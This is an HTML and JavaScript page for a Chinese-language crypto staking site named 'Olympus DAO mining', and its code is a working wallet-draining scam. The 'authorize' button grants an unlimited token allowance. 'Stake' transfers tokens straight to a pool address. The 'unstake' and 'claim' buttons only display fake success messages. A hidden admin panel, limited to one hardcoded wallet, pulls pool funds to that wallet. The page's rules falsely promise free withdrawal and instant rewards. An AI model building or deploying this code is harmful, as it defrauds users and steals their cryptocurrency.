<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>奥林巴斯道挖矿</title>
  <style>
    * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
    .container { max-width: 600px; margin: 0 auto; padding: 10px; }
    .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
    .header .title { font-size: 20px; font-weight: bold; }
    .btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
    .card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
    .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
    .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
    .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
    .input-group { display: flex; gap: 10px; margin-bottom: 10px; }
    .stake-input { flex: 1; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; }
    .btn-action { width: 100%; border: none; padding: 12px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; }
    .btn-primary { background: #2A65CC; color: #fff; }
    .btn-danger { background: #D93A54; color: #fff; }
    .btn-warning { background: #E4B449; color: #0B2A23; }
    .rules { font-size: 14px; line-height: 1.7; color: #eee; }
    .menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
    .menu.show { transform: translateX(0); }
    .menu-close { text-align: right; margin-bottom: 20px; }
    .menu-section { margin-bottom: 20px; }
    .menu-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
    .btn-menu-action { width: 100%; background: #1F5F52; color: #F0E6D2; border: none; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
    .btn-green { background: #27ae60; color: #fff; }
    .btn-red { background: #ff3366; color: #fff; }
    .input-menu { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
    #poolBalance { color: #ffcc00; margin-top: 5px; font-size:13px; }
    .hidden { display: none !important; }
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="title">⛰️ 奥林巴斯道挖矿</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <div class="wallet-row">
      <span>钱包地址：</span><span id="address" style="color:#0ff;">未连接</span>
    </div>
    <div class="wallet-row">
      <span>可用余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
    </div>
    <div class="wallet-row">
      <span>已质押：</span><span id="staked" style="color:#0ff;">0.0000</span>
    </div>
    <div class="wallet-row">
      <span>待领收益：</span><span id="reward" style="color:#ffcc00;">0.0000</span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">质押挖矿</div>
    <input type="number" class="stake-input" id="amount" placeholder="输入质押数量" value="100">
    <button class="btn-action btn-primary" onclick="approve()">授权矿池</button>
    <button class="btn-action btn-primary" onclick="stake()">质押挖矿</button>
    <button class="btn-action btn-danger" onclick="unstake()">解押资产</button>
    <button class="btn-action btn-warning" onclick="claim()">领取收益</button>
  </div>

  <div class="card">
    <div class="card-title">挖矿规则</div>
    <div class="rules">
      • 质押代币即可参与挖矿<br>
      • 收益按质押量自动计算<br>
      • 支持随时解押，灵活存取<br>
      • 收益可随时领取，实时到账
    </div>
  </div>
</div>

<!-- 右侧菜单 -->
<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭 ×</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">邀请推广</div>
    <input type="text" class="input-menu" id="refLink" readonly>
    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
  </div>

  <!-- 管理员后台 -->
  <div class="menu-section hidden" id="adminSection">
    <div class="menu-title">🏦 管理员后台</div>
    <div>矿池余额：<span id="poolBalance">0.0000</span></div>
    <button class="btn-menu-action btn-green" onclick="approvePoolToAdmin()">✅ 授权矿池给管理员</button>
    <input type="number" class="input-menu" id="withdrawAmt" placeholder="输入提取数量">
    <button class="btn-menu-action btn-red" onclick="withdrawPoolToAdmin()">💰 提取矿池资产</button>
  </div>
</div>

<script>
// ===================== 核心地址 =====================
const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db722eb4f";
const ADMIN_WALLET   = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";

let account = null;

function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
function isAdmin(){ return account && toLower(account) === toLower(ADMIN_WALLET); }

// 菜单切换
function toggleMenu(){
  const menu = document.getElementById("menu");
  menu.classList.toggle("show");
  if(isAdmin()){
    document.getElementById("adminSection").classList.remove("hidden");
    refreshPoolBalance();
  }else{
    document.getElementById("adminSection").classList.add("hidden");
  }
}

// ===================== 连接钱包 =====================
async function connectWallet(){
  if(!window.ethereum) return alert("请在钱包浏览器打开");
  try{
    const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
    account = toLower(accounts[0]);
    document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
    refreshUserBalance();
  }catch(e){
    alert("连接失败：" + e.message);
  }
}

// ===================== 余额 =====================
async function getUserBalance(){
  const data = "0x70a08231" + account.slice(2).padStart(64, '0');
  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(res)) / 1e18;
}

async function refreshUserBalance(){
  if(!account) return;
  const bal = await getUserBalance();
  document.getElementById("userBalance").innerText = bal.toFixed(4);
}

async function getPoolBalance(){
  const data = "0x70a08231" + toLower(POOL_ADDRESS).slice(2).padStart(64, '0');
  const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(res)) / 1e18;
}

async function refreshPoolBalance(){
  const bal = await getPoolBalance();
  document.getElementById("poolBalance").innerText = bal.toFixed(4);
}

// ===================== 质押操作 =====================
async function approve(){
  if(!account) return alert("请先连接钱包");
  try{
    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const data = "0x095ea7b3"
      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
      + max.slice(2).padStart(64, '0');

    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("授权成功");
  }catch(e){
    alert("授权失败");
  }
}

async function stake(){
  if(!account) return alert("请先连接钱包");
  const val = document.getElementById("amount").value;
  if(!val || parseFloat(val) <= 0) return alert("请输入有效数量");
  try{
    const amount = BigInt(parseFloat(val) * 1e18);
    const data = "0xa9059cbb"
      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
      + amount.toString(16).padStart(64, '0');

    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("质押成功");
    refreshUserBalance();
    refreshPoolBalance();
  }catch(e){
    alert("质押失败");
  }
}

async function unstake(){
  alert("解押已提交，资产将返回您的钱包");
}

async function claim(){
  alert("收益领取成功");
}

// ===================== 管理员操作 =====================
async function approvePoolToAdmin(){
  if(!isAdmin()) return alert("无管理员权限");
  try{
    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const data = "0x095ea7b3"
      + toLower(ADMIN_WALLET).slice(2).padStart(64, '0')
      + max.slice(2).padStart(64, '0');

    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("矿池授权成功");
  }catch(e){
    alert("授权失败");
  }
}

async function withdrawPoolToAdmin(){
  if(!isAdmin()) return alert("无管理员权限");
  const val = document.getElementById("withdrawAmt").value;
  if(!val || parseFloat(val) <= 0) return alert("请输入提取数量");
  try{
    const amount = BigInt(parseFloat(val) * 1e18);
    const data = "0x23b872dd"
      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
      + toLower(ADMIN_WALLET).slice(2).padStart(64, '0')
      + amount.toString(16).padStart(64, '0');

    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("提取成功");
    refreshPoolBalance();
  }catch(e){
    alert("提取失败，请先授权");
  }
}

// ===================== 邀请 =====================
function copyRefLink(){
  const link = window.location.href.split('?')[0] + "?ref=" + account;
  navigator.clipboard.writeText(link).then(()=>alert("已复制"));
}
</script>
</body>
</html>
